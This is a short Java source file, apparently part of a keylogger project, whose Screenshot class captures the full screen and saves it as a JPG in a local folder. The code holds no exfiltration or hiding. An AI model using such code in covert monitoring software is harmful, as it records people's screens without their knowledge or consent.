/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;

/**
 *
 * @author sparsha
 */
import java.io.*;
import java.awt.AWTException;
import java.awt.FlowLayout;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import javax.swing.JFrame;
import javax.swing.JLabel;
public class Screenshot extends JFrame{
    String format;
    String filename;

    public Screenshot(String name)
    {
        format=".jpg";
        filename=name;
    }
    
    public boolean getscreenshot()
    {

        try{
            
           
         Robot robot = new Robot();
         String fileName = "Screenshots/"+filename+format+"";
 
         Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit()
                                     .getScreenSize());
         BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
         ImageIO.write(screenFullImage, "jpg", new File(fileName));
 
         
            
            
            
            
        }
        catch(Exception e)
        {
            System.out.println(e.getMessage());
        }
        
        return true;
    }
}
